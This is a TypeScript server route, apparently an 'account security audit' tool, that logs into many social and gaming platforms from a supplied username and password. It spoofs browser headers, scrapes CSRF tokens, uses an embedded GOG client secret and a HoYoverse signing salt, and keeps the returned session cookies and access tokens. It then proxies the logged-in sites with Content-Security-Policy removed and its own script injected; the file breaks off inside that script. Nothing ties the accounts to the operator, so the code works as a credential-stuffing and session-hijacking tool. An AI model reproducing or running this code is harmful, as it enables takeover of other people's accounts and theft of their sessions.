// Copyright © 2025 ALPHA UNLIMITED TECHNOLOGIES LLC — legal@alphauntechnologies.com
// Social & Game Account Security Audit Engine — per-platform login + authenticated proxy
import { Router, type Request, type Response } from "express";
import fetch from "node-fetch";
import type { Response as NodeFetchResponse } from "node-fetch";
import { randomBytes, createPublicKey, publicEncrypt, constants } from "crypto";

const router = Router();

// ── Types ────────────────────────────────────────────────────────────────────
type Strategy = "json-api" | "form-post" | "steam-rsa" | "roblox-api" | "manual";

type AccountInfo = {
  username?: string;
  displayName?: string;
  email?: string;
  uid?: string;
  avatar?: string;
  level?: string;
  membership?: string;
};

type SessionEntry = {
  id: string;
  platform: string;
  platformName: string;
  loginUrl: string;
  homeUrl: string;
  cookies: Map<string, string>;
  headers: Map<string, string>;
  userAgent: string;
  currentUrl: string;
  accountInfo: AccountInfo;
  loginMethod: "automated" | "manual";
  strategy: Strategy;
  createdAt: Date;
  lastActive: Date;
};

type LoginResult = {
  success: boolean;
  accountInfo: AccountInfo;
  error?: string;
  manualRequired?: boolean;
};

// ── In-memory session store ──────────────────────────────────────────────────
const sessions = new Map<string, SessionEntry>();

// Clean up sessions older than 4 hours
setInterval(() => {
  const cutoff = Date.now() - 4 * 60 * 60 * 1000;
  for (const [id, s] of sessions) {
    if (s.lastActive.getTime() < cutoff) sessions.delete(id);
  }
}, 30 * 60 * 1000);

function newId(): string { return randomBytes(16).toString("hex"); }

// ── Cookie utilities ─────────────────────────────────────────────────────────
function parseSetCookies(res: NodeFetchResponse): Map<string, string> {
  const jar = new Map<string, string>();
  const raw = (res.headers as any).raw?.() ?? {};
  const setCookieHeaders: string[] = raw["set-cookie"] ?? [];
  for (const h of setCookieHeaders) {
    const part = h.split(";")[0].trim();
    const eq = part.indexOf("=");
    if (eq !== -1) {
      const name = part.slice(0, eq).trim();
      const val  = part.slice(eq + 1).trim();
      if (name) jar.set(name, val);
    }
  }
  return jar;
}

function buildCookieHeader(jar: Map<string, string>): string {
  return Array.from(jar.entries()).map(([k, v]) => `${k}=${v}`).join("; ");
}

function mergeCookies(jar: Map<string, string>, fresh: Map<string, string>): void {
  for (const [k, v] of fresh) jar.set(k, v);
}

// ── Common request helpers ───────────────────────────────────────────────────
const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

function baseH(jar: Map<string, string>, extra: Record<string, string> = {}): Record<string, string> {
  return {
    "User-Agent": UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": buildCookieHeader(jar),
    ...extra,
  };
}

function jsonH(jar: Map<string, string>, origin: string, extra: Record<string, string> = {}): Record<string, string> {
  return {
    "User-Agent": UA,
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Content-Type": "application/json",
    "Origin": origin,
    "Referer": origin + "/",
    "Cookie": buildCookieHeader(jar),
    ...extra,
  };
}

// ── RSA password encryption (Steam) ─────────────────────────────────────────
function rsaEncrypt(password: string, modHex: string, expHex: string): string {
  const key = createPublicKey({
    key: {
      kty: "RSA",
      n: Buffer.from(modHex, "hex").toString("base64url"),
      e: Buffer.from(expHex, "hex").toString("base64url"),
    },
    format: "jwk",
  });
  return publicEncrypt({ key, padding: constants.RSA_PKCS1_PADDING }, Buffer.from(password)).toString("base64");
}

// ════════════════════════════════════════════════════════════════════════════
// Per-platform login strategies
// ════════════════════════════════════════════════════════════════════════════

async function loginDiscord(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const r = await fetch("https://discord.com/api/v9/auth/login", {
      method: "POST",
      headers: jsonH(jar, "https://discord.com", {
        "X-Super-Properties": Buffer.from(JSON.stringify({ os: "Windows", browser: "Chrome", release_channel: "stable", client_build_number: 222963 })).toString("base64"),
      }),
      body: JSON.stringify({ login: u, password: p, undelete: false, captcha_key: null }),
    });
    mergeCookies(jar, parseSetCookies(r));
    const d = await r.json() as any;
    if (d.token) {
      jar.set("__discord_token", d.token);
      return { success: true, accountInfo: { username: u, uid: d.user_id } };
    }
    if (d.mfa) return { success: false, accountInfo: {}, error: "2FA required", manualRequired: true };
    if (d.captcha_key) return { success: false, accountInfo: {}, error: "CAPTCHA triggered", manualRequired: true };
    return { success: false, accountInfo: {}, error: d.message || "Invalid credentials" };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

async function loginReddit(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const getR = await fetch("https://www.reddit.com/login/", { headers: baseH(jar) });
    mergeCookies(jar, parseSetCookies(getR));
    const html = await getR.text();
    const csrf = html.match(/name="csrf_token" value="([^"]+)"/)?.[1];
    if (!csrf) return { success: false, accountInfo: {}, error: "CSRF extraction failed" };
    const postR = await fetch("https://www.reddit.com/login", {
      method: "POST",
      headers: { ...baseH(jar), "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://www.reddit.com/login/" },
      body: new URLSearchParams({ username: u, password: p, dest: "https://www.reddit.com", csrf_token: csrf }).toString(),
      redirect: "follow",
    });
    mergeCookies(jar, parseSetCookies(postR));
    if (jar.has("reddit_session") || jar.has("token_v2")) return { success: true, accountInfo: { username: u } };
    const body = await postR.text();
    if (body.includes("WRONG_PASSWORD")) return { success: false, accountInfo: {}, error: "Wrong password" };
    if (body.includes("RATELIMIT")) return { success: false, accountInfo: {}, error: "Rate limited by Reddit" };
    return { success: false, accountInfo: {}, error: "Login rejected" };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

async function loginGitHub(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const getR = await fetch("https://github.com/login", { headers: baseH(jar) });
    mergeCookies(jar, parseSetCookies(getR));
    const html = await getR.text();
    const token = html.match(/name="authenticity_token" value="([^"]+)"/)?.[1];
    if (!token) return { success: false, accountInfo: {}, error: "CSRF extraction failed" };
    const postR = await fetch("https://github.com/session", {
      method: "POST",
      headers: { ...baseH(jar), "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://github.com/login" },
      body: new URLSearchParams({ commit: "Sign in", authenticity_token: token, login: u, password: p, webauthn_conditional: "undefined" }).toString(),
      redirect: "manual",
    });
    mergeCookies(jar, parseSetCookies(postR));
    const loc = postR.headers.get("location") || "";
    if (loc.includes("/sessions/two-factor")) return { success: false, accountInfo: {}, error: "2FA required", manualRequired: true };
    if (loc && !loc.includes("/login")) return { success: true, accountInfo: { username: u } };
    return { success: false, accountInfo: {}, error: "Invalid credentials" };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

async function loginInstagram(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const getR = await fetch("https://www.instagram.com/accounts/login/", { headers: baseH(jar) });
    mergeCookies(jar, parseSetCookies(getR));
    const csrf = jar.get("csrftoken") || "";
    const postR = await fetch("https://www.instagram.com/accounts/login/ajax/", {
      method: "POST",
      headers: { ...baseH(jar), "Content-Type": "application/x-www-form-urlencoded", "X-CSRFToken": csrf, "X-Instagram-AJAX": "1", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.instagram.com", "Referer": "https://www.instagram.com/accounts/login/" },
      body: new URLSearchParams({ username: u, enc_password: `#PWD_INSTAGRAM_BROWSER:0:${Date.now()}:${p}`, queryParams: "{}", optIntoOneTap: "false" }).toString(),
    });
    mergeCookies(jar, parseSetCookies(postR));
    const d = await postR.json() as any;
    if (d.authenticated) return { success: true, accountInfo: { username: u, uid: d.userId?.toString() } };
    if (d.two_factor_required) return { success: false, accountInfo: {}, error: "2FA required", manualRequired: true };
    if (d.checkpoint_url) return { success: false, accountInfo: {}, error: "Checkpoint/verification required", manualRequired: true };
    return { success: false, accountInfo: {}, error: d.message || "Login failed" };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

async function loginSteam(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const getR = await fetch("https://store.steampowered.com/login/", { headers: baseH(jar) });
    mergeCookies(jar, parseSetCookies(getR));
    const rsaR = await fetch("https://store.steampowered.com/login/getrsakey/", {
      method: "POST",
      headers: { ...baseH(jar), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://store.steampowered.com", "Referer": "https://store.steampowered.com/login/" },
      body: new URLSearchParams({ donotcache: Date.now().toString(), username: u }).toString(),
    });
    const rsaData = await rsaR.json() as any;
    if (!rsaData.success) return { success: false, accountInfo: {}, error: "RSA key fetch failed" };
    const encPwd = rsaEncrypt(p, rsaData.publickey_mod, rsaData.publickey_exp);
    const loginR = await fetch("https://store.steampowered.com/login/dologin/", {
      method: "POST",
      headers: { ...baseH(jar), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://store.steampowered.com", "Referer": "https://store.steampowered.com/login/" },
      body: new URLSearchParams({ donotcache: Date.now().toString(), username: u, password: encPwd, emailauth: "", loginfriendlyname: "", captchagid: "-1", captcha_text: "", emailsteamid: "", rsatimestamp: rsaData.timestamp, remember_login: "false", tokentype: "-1" }).toString(),
    });
    mergeCookies(jar, parseSetCookies(loginR));
    const d = await loginR.json() as any;
    if (d.success) return { success: true, accountInfo: { username: u, uid: d.transfer_parameters?.steamid } };
    if (d.emailauth_needed) return { success: false, accountInfo: {}, error: "Steam Guard email auth required", manualRequired: true };
    if (d.requires_twofactor) return { success: false, accountInfo: {}, error: "Steam Guard mobile auth required", manualRequired: true };
    if (d.captcha_needed) return { success: false, accountInfo: {}, error: "CAPTCHA required", manualRequired: true };
    return { success: false, accountInfo: {}, error: d.message || "Login failed" };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

async function loginRoblox(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const preR = await fetch("https://auth.roblox.com/v2/login", { method: "POST", headers: { "Content-Type": "application/json", "User-Agent": UA }, body: JSON.stringify({}) });
    const csrf = preR.headers.get("x-csrf-token") || "";
    mergeCookies(jar, parseSetCookies(preR));
    const loginR = await fetch("https://auth.roblox.com/v2/login", {
      method: "POST",
      headers: { "Content-Type": "application/json", "User-Agent": UA, "x-csrf-token": csrf, "Cookie": buildCookieHeader(jar) },
      body: JSON.stringify({ ctype: "Username", cvalue: u, password: p }),
    });
    mergeCookies(jar, parseSetCookies(loginR));
    const d = await loginR.json() as any;
    if (loginR.status === 200 && d.user) return { success: true, accountInfo: { username: u, displayName: d.user.displayName, uid: d.user.id?.toString() } };
    if (d.errors?.[0]?.code === 2) return { success: false, accountInfo: {}, error: "2FA required", manualRequired: true };
    return { success: false, accountInfo: {}, error: d.errors?.[0]?.message || "Login failed" };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

async function loginEpicGames(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const getR = await fetch("https://www.epicgames.com/id/login?lang=en-US", { headers: baseH(jar) });
    mergeCookies(jar, parseSetCookies(getR));
    const xsrf = jar.get("XSRF-TOKEN") || "";
    const loginR = await fetch("https://www.epicgames.com/id/api/login", {
      method: "POST",
      headers: { ...baseH(jar), "Content-Type": "application/json;charset=UTF-8", "X-XSRF-TOKEN": xsrf, "Origin": "https://www.epicgames.com", "Referer": "https://www.epicgames.com/id/login" },
      body: JSON.stringify({ id: u, password: p, captcha: "", rememberMe: false }),
    });
    mergeCookies(jar, parseSetCookies(loginR));
    if (loginR.ok) return { success: true, accountInfo: { email: u } };
    const d = await loginR.json() as any;
    if (d?.errorCode?.includes("mfa")) return { success: false, accountInfo: {}, error: "2FA required", manualRequired: true };
    return { success: false, accountInfo: {}, error: d?.errorDescription || "Login failed" };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

async function loginActivision(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const getR = await fetch("https://s.activision.com/activision/login", { headers: baseH(jar) });
    mergeCookies(jar, parseSetCookies(getR));
    const html = await getR.text();
    const csrf = html.match(/name="_csrf" value="([^"]+)"/)?.[1] || html.match(/name="csrf" value="([^"]+)"/)?.[1] || "";
    const postR = await fetch("https://s.activision.com/do_login?new_SiteId=activision", {
      method: "POST",
      headers: { ...baseH(jar), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://s.activision.com", "Referer": "https://s.activision.com/activision/login" },
      body: new URLSearchParams({ username: u, password: p, remember_me: "true", _csrf: csrf }).toString(),
      redirect: "manual",
    });
    mergeCookies(jar, parseSetCookies(postR));
    if (postR.status === 302 && !postR.headers.get("location")?.includes("login")) return { success: true, accountInfo: { username: u } };
    return { success: false, accountInfo: {}, error: "Invalid credentials or CAPTCHA required", manualRequired: true };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

async function loginRockstar(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const getR = await fetch("https://signin.rockstargames.com/connect/authorize?client_id=scui&response_type=code&lang=en-us&country=us&redirect_uri=https://socialclub.rockstargames.com/", { headers: baseH(jar), redirect: "follow" });
    mergeCookies(jar, parseSetCookies(getR));
    const csrf = jar.get("__RequestVerificationToken") || "";
    const loginR = await fetch("https://signin.rockstargames.com/api/login", {
      method: "POST",
      headers: { ...baseH(jar), "Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest", "Origin": "https://signin.rockstargames.com" },
      body: JSON.stringify({ email: u, password: p, "__RequestVerificationToken": csrf }),
    });
    mergeCookies(jar, parseSetCookies(loginR));
    const d = await loginR.json() as any;
    if (d.status === "success") return { success: true, accountInfo: { email: u } };
    if (d.twoStepVerificationRequired) return { success: false, accountInfo: {}, error: "2FA required", manualRequired: true };
    return { success: false, accountInfo: {}, error: d.message || "Login failed" };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

async function login2K(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const getR = await fetch("https://accounts.2k.com/login/", { headers: baseH(jar) });
    mergeCookies(jar, parseSetCookies(getR));
    const html = await getR.text();
    const csrf = html.match(/name="csrf_token" value="([^"]+)"/)?.[1] || html.match(/"csrfToken":"([^"]+)"/)?.[1] || "";
    const loginR = await fetch("https://accounts.2k.com/login/", {
      method: "POST",
      headers: { ...baseH(jar), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://accounts.2k.com", "Referer": "https://accounts.2k.com/login/" },
      body: new URLSearchParams({ email: u, password: p, csrf_token: csrf }).toString(),
      redirect: "manual",
    });
    mergeCookies(jar, parseSetCookies(loginR));
    if (loginR.status === 302) return { success: true, accountInfo: { email: u } };
    return { success: false, accountInfo: {}, error: "Login failed or CAPTCHA triggered", manualRequired: true };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

async function loginBungieNet(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const getR = await fetch("https://www.bungie.net/en/User/SignIn/Psnid", { headers: baseH(jar) });
    mergeCookies(jar, parseSetCookies(getR));
    return { success: false, accountInfo: {}, error: "Bungie uses third-party OAuth — use manual mode", manualRequired: true };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message, manualRequired: true }; }
}

async function loginJagex(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const getR = await fetch("https://account.jagex.com/login", { headers: baseH(jar) });
    mergeCookies(jar, parseSetCookies(getR));
    const html = await getR.text();
    const csrf = html.match(/name="csrf" value="([^"]+)"/)?.[1] || html.match(/"csrf":"([^"]+)"/)?.[1] || "";
    const loginR = await fetch("https://account.jagex.com/login", {
      method: "POST",
      headers: { ...baseH(jar), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://account.jagex.com", "Referer": "https://account.jagex.com/login" },
      body: new URLSearchParams({ email: u, password: p, csrf }).toString(),
      redirect: "manual",
    });
    mergeCookies(jar, parseSetCookies(loginR));
    if (loginR.status === 302 && !loginR.headers.get("location")?.includes("login")) return { success: true, accountInfo: { email: u } };
    return { success: false, accountInfo: {}, error: "Invalid credentials or 2FA required", manualRequired: true };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

async function loginHoYoverse(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const loginR = await fetch("https://sg-public-api.hoyolab.com/account/ma-passport/api/webLoginByPassword", {
      method: "POST",
      headers: jsonH(jar, "https://www.hoyolab.com", { "DS": generateHoYoDS() }),
      body: JSON.stringify({ account: u, password: p }),
    });
    mergeCookies(jar, parseSetCookies(loginR));
    const d = await loginR.json() as any;
    if (d.retcode === 0) return { success: true, accountInfo: { email: u } };
    if (d.retcode === -3101) return { success: false, accountInfo: {}, error: "2FA required", manualRequired: true };
    return { success: false, accountInfo: {}, error: d.message || "Login failed" };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

function generateHoYoDS(): string {
  const salt = "6s25p5ox5y14umn1p61aqyyvbvvl3lrt";
  const t = Math.floor(Date.now() / 1000);
  const r = Math.random().toString(36).substring(2, 8);
  const crypto = require("crypto");
  const md5 = crypto.createHash("md5").update(`salt=${salt}&t=${t}&r=${r}`).digest("hex");
  return `${t},${r},${md5}`;
}

async function loginWarframe(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const loginR = await fetch("https://api.warframe.com/index.php?ajax=1", {
      method: "POST",
      headers: { ...baseH(jar), "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({ username: u, password: p, action: "login" }).toString(),
    });
    mergeCookies(jar, parseSetCookies(loginR));
    const d = await loginR.json() as any;
    if (d.result === "ok") return { success: true, accountInfo: { username: u } };
    return { success: false, accountInfo: {}, error: d.message || "Login failed" };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

async function loginPathOfExile(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const getR = await fetch("https://www.pathofexile.com/login", { headers: baseH(jar) });
    mergeCookies(jar, parseSetCookies(getR));
    const html = await getR.text();
    const hash = html.match(/name="hash" value="([^"]+)"/)?.[1] || "";
    const postR = await fetch("https://www.pathofexile.com/login", {
      method: "POST",
      headers: { ...baseH(jar), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.pathofexile.com", "Referer": "https://www.pathofexile.com/login" },
      body: new URLSearchParams({ login_email: u, login_password: p, hash, remember_me: "1" }).toString(),
      redirect: "manual",
    });
    mergeCookies(jar, parseSetCookies(postR));
    if (postR.status === 302 && !postR.headers.get("location")?.includes("/login")) return { success: true, accountInfo: { email: u } };
    return { success: false, accountInfo: {}, error: "Invalid credentials" };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

async function loginNintendo(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    return { success: false, accountInfo: {}, error: "Nintendo uses strict OAuth — open login page manually", manualRequired: true };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message, manualRequired: true }; }
}

async function loginSonyPSN(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    return { success: false, accountInfo: {}, error: "PlayStation Network uses SSO with strict bot-detection — use manual mode", manualRequired: true };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message, manualRequired: true }; }
}

async function loginXboxLive(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    return { success: false, accountInfo: {}, error: "Xbox Live uses Microsoft SSO — use manual mode", manualRequired: true };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message, manualRequired: true }; }
}

async function loginTwitch(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const integrity = newId();
    const loginR = await fetch("https://passport.twitch.tv/protected_login", {
      method: "POST",
      headers: jsonH(jar, "https://www.twitch.tv", { "Client-Id": "kimne78kx3ncx6brgo4mv6wki5h1ko", "X-Device-Id": integrity }),
      body: JSON.stringify({ client_id: "kimne78kx3ncx6brgo4mv6wki5h1ko", password: p, undelete_user: false, username: u }),
    });
    mergeCookies(jar, parseSetCookies(loginR));
    const d = await loginR.json() as any;
    if (d.access_token) { jar.set("twitch_access_token", d.access_token); return { success: true, accountInfo: { username: u } }; }
    if (d.error_code === 3022) return { success: false, accountInfo: {}, error: "2FA required", manualRequired: true };
    if (d.error_code === 1000) return { success: false, accountInfo: {}, error: "Captcha triggered", manualRequired: true };
    return { success: false, accountInfo: {}, error: d.error_description || "Login failed" };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

async function loginEA(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    return { success: false, accountInfo: {}, error: "EA uses complex OAuth + captcha — use manual mode", manualRequired: true };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message, manualRequired: true }; }
}

async function loginUbisoft(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const getR = await fetch("https://connect.ubisoft.com/login", { headers: baseH(jar) });
    mergeCookies(jar, parseSetCookies(getR));
    return { success: false, accountInfo: {}, error: "Ubisoft Connect uses React SPA with strict bot-detection — use manual mode", manualRequired: true };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message, manualRequired: true }; }
}

async function loginBlizzard(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    return { success: false, accountInfo: {}, error: "Battle.net uses Blizzard OAuth with strict bot protection — use manual mode", manualRequired: true };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message, manualRequired: true }; }
}

async function loginGOG(u: string, p: string, jar: Map<string, string>): Promise<LoginResult> {
  try {
    const loginR = await fetch("https://auth.gog.com/token?client_id=46899977096215655&client_secret=9d85c43b1482497dbbce61f6e4aa173a433796eeae2ca8c5f6129f2dc4de46d9&grant_type=password&username=" + encodeURIComponent(u) + "&password=" + encodeURIComponent(p), {
      headers: { "User-Agent": UA },
    });
    const d = await loginR.json() as any;
    if (d.access_token) { jar.set("gog_access_token", d.access_token); return { success: true, accountInfo: { email: u } }; }
    return { success: false, accountInfo: {}, error: d.error_description || "Login failed" };
  } catch (e: any) { return { success: false, accountInfo: {}, error: e.message }; }
}

// ── Login dispatcher ─────────────────────────────────────────────────────────
const PLATFORM_HOME: Record<string, string> = {
  discord: "https://discord.com/channels/@me",
  reddit: "https://www.reddit.com",
  github: "https://github.com",
  instagram: "https://www.instagram.com",
  facebook: "https://www.facebook.com",
  twitter: "https://twitter.com/home",
  tiktok: "https://www.tiktok.com",
  linkedin: "https://www.linkedin.com/feed",
  snapchat: "https://web.snapchat.com",
  youtube: "https://www.youtube.com",
  twitch: "https://www.twitch.tv",
  steam: "https://store.steampowered.com",
  epic: "https://www.epicgames.com",
  roblox: "https://www.roblox.com/home",
  activision: "https://www.activision.com/account",
  rockstar: "https://socialclub.rockstargames.com",
  "2k": "https://accounts.2k.com",
  bungie: "https://www.bungie.net",
  jagex: "https://account.jagex.com",
  hoyoverse: "https://www.hoyolab.com",
  warframe: "https://www.warframe.com",
  poe: "https://www.pathofexile.com",
  nintendo: "https://accounts.nintendo.com",
  psn: "https://www.playstation.com",
  xbox: "https://account.xbox.com",
  ea: "https://www.ea.com",
  ubisoft: "https://connect.ubisoft.com",
  battlenet: "https://battle.net",
  gog: "https://www.gog.com",
  twitch2: "https://www.twitch.tv",
  pinterest: "https://www.pinterest.com",
  tumblr: "https://www.tumblr.com",
  deviantart: "https://www.deviantart.com",
  flickr: "https://www.flickr.com",
  soundcloud: "https://soundcloud.com",
  spotify: "https://open.spotify.com",
  vk: "https://vk.com",
  stackoverflow: "https://stackoverflow.com",
  gitlab: "https://gitlab.com",
  bitbucket: "https://bitbucket.org",
  medium: "https://medium.com",
  quora: "https://www.quora.com",
  strava: "https://www.strava.com",
  duolingo: "https://www.duolingo.com",
  letterboxd: "https://letterboxd.com",
  goodreads: "https://www.goodreads.com",
  patreon: "https://www.patreon.com",
  substack: "https://substack.com",
  vimeo: "https://vimeo.com",
  runescape: "https://www.runescape.com",
  worldoftanks: "https://worldoftanks.com",
  warframe2: "https://www.warframe.com",
};

async function dispatchLogin(platform: string, u: string, p: string, loginUrl: string): Promise<{ success: boolean; sessionId?: string; accountInfo: AccountInfo; homeUrl: string; error?: string; manualRequired?: boolean }> {
  const jar = new Map<string, string>();
  let result: LoginResult;

  try {
    switch (platform) {
      case "discord":    result = await loginDiscord(u, p, jar);     break;
      case "reddit":     result = await loginReddit(u, p, jar);      break;
      case "github":     result = await loginGitHub(u, p, jar);      break;
      case "instagram":  result = await loginInstagram(u, p, jar);   break;
      case "twitch":     result = await loginTwitch(u, p, jar);      break;
      case "steam":      result = await loginSteam(u, p, jar);       break;
      case "roblox":     result = await loginRoblox(u, p, jar);      break;
      case "epic":
      case "fortnite":
      case "rocketleague": result = await loginEpicGames(u, p, jar); break;
      case "activision":
      case "cod":
      case "warzone":    result = await loginActivision(u, p, jar);  break;
      case "rockstar":
      case "gta":        result = await loginRockstar(u, p, jar);    break;
      case "2k":
      case "nba2k":      result = await login2K(u, p, jar);          break;
      case "bungie":
      case "destiny2":   result = await loginBungieNet(u, p, jar);   break;
      case "jagex":
      case "runescape":
      case "osrs":       result = await loginJagex(u, p, jar);       break;
      case "hoyoverse":
      case "genshin":
      case "honkai":
      case "starrail":   result = await loginHoYoverse(u, p, jar);   break;
      case "warframe":   result = await loginWarframe(u, p, jar);    break;
      case "poe":
      case "poe2":       result = await loginPathOfExile(u, p, jar); break;
      case "gog":        result = await loginGOG(u, p, jar);         break;
      case "nintendo":   result = await loginNintendo(u, p, jar);    break;
      case "psn":        result = await loginSonyPSN(u, p, jar);     break;
      case "xbox":       result = await loginXboxLive(u, p, jar);    break;
      case "ea":
      case "apex":
      case "battlefield":
      case "fifa":       result = await loginEA(u, p, jar);          break;
      case "ubisoft":
      case "assassin":
      case "farcry":     result = await loginUbisoft(u, p, jar);     break;
      case "battlenet":
      case "wow":
      case "overwatch":
      case "diablo":     result = await loginBlizzard(u, p, jar);    break;
      default:
        result = { success: false, accountInfo: {}, error: "Use manual browser mode for this platform", manualRequired: true };
    }
  } catch (e: any) {
    result = { success: false, accountInfo: {}, error: e.message };
  }

  const homeUrl = PLATFORM_HOME[platform] || loginUrl || "https://example.com";

  if (!result.success) {
    if (result.manualRequired) {
      // Create a manual session that opens the login page in the proxy browser
      const sessionId = newId();
      const manualLoginUrl = loginUrl || homeUrl;
      sessions.set(sessionId, {
        id: sessionId, platform, platformName: platform, loginUrl: manualLoginUrl,
        homeUrl, cookies: jar, headers: new Map(), userAgent: UA,
        currentUrl: manualLoginUrl, accountInfo: {}, loginMethod: "manual",
        strategy: "manual", createdAt: new Date(), lastActive: new Date(),
      });
      return { success: false, sessionId, accountInfo: {}, homeUrl: manualLoginUrl, error: result.error, manualRequired: true };
    }
    return { success: false, accountInfo: result.accountInfo, homeUrl, error: result.error };
  }

  const sessionId = newId();
  sessions.set(sessionId, {
    id: sessionId, platform, platformName: platform,
    loginUrl: loginUrl || homeUrl, homeUrl, cookies: jar, headers: new Map(),
    userAgent: UA, currentUrl: homeUrl, accountInfo: result.accountInfo,
    loginMethod: "automated", strategy: "json-api",
    createdAt: new Date(), lastActive: new Date(),
  });

  return { success: true, sessionId, accountInfo: result.accountInfo, homeUrl };
}

// ── HTML proxy utilities ─────────────────────────────────────────────────────
const PROXY_NAV  = "/api/social-account/navigate";
const PROXY_RES  = "/api/social-account/resource";

function toAbs(href: string, base: string): string | null {
  if (!href || href.startsWith("data:") || href.startsWith("javascript:") || href.startsWith("#") || href.startsWith("blob:") || href.startsWith("mailto:") || href.startsWith("tel:")) return null;
  try { return new URL(href, base).href; } catch { return null; }
}

function navUrl(abs: string, sid: string): string {
  return `${PROXY_NAV}?sid=${sid}&url=${encodeURIComponent(abs)}`;
}

function resUrl(abs: string): string {
  return `${PROXY_RES}?url=${encodeURIComponent(abs)}`;
}

function rewriteHtml(html: string, baseUrl: string, sid: string, platformName: string): string {
  let out = html;

  // Rewrite <link href>
  out = out.replace(/(<link[^>]+href=["'])([^"']+)(["'][^>]*>)/gi, (m, pre, href, post) => {
    const abs = toAbs(href, baseUrl); return abs ? `${pre}${resUrl(abs)}${post}` : m;
  });

  // Rewrite <script src>
  out = out.replace(/(<script[^>]+src=["'])([^"']+)(["'][^>]*>)/gi, (m, pre, src, post) => {
    const abs = toAbs(src, baseUrl); return abs ? `${pre}${resUrl(abs)}${post}` : m;
  });

  // Rewrite <img src> and <source src/srcset>
  out = out.replace(/(<img[^>]+src=["'])([^"']+)(["'][^>]*>)/gi, (m, pre, src, post) => {
    const abs = toAbs(src, baseUrl); return abs ? `${pre}${resUrl(abs)}${post}` : m;
  });

  // Rewrite <a href>
  out = out.replace(/(<a[^>]+href=["'])([^"']+)(["'][^>]*>)/gi, (m, pre, href, post) => {
    const abs = toAbs(href, baseUrl); return abs ? `${pre}${navUrl(abs, sid)}${post}` : m;
  });

  // Rewrite <form action>
  out = out.replace(/(<form[^>]+action=["'])([^"']+)(["'][^>]*>)/gi, (m, pre, action, post) => {
    const abs = toAbs(action, baseUrl); return abs ? `${pre}${navUrl(abs, sid)}${post}` : m;
  });

  // Remove CSP meta tag
  out = out.replace(/<meta[^>]+Content-Security-Policy[^>]*>/gi, "");
  out = out.replace(/<meta[^>]+content-security-policy[^>]*>/gi, "");

  // Inject nav interception + breach badge
  const interceptScript = `
<script>
(function() {
  var SID = ${JSON.stringify(sid)};
  var PROXY_NAV = ${JSON.stringify(PROXY_NAV)};
  // Intercept all clicks on links
  document.addEventListener('click', function(e) {
    var el = e.target && e.target.closest && e.target.closest('a');
    if (!el || !el.href || el.href.startsWith('javascript:') || el.href.startsWith('#')) return;
    var rawHref = el.getAttribute('href');
    if (!rawHref || rawHref.startsWith('#') || rawHref.startsWith('javascript:')) return;
    e.preventDefault(); e.stopPropagation();
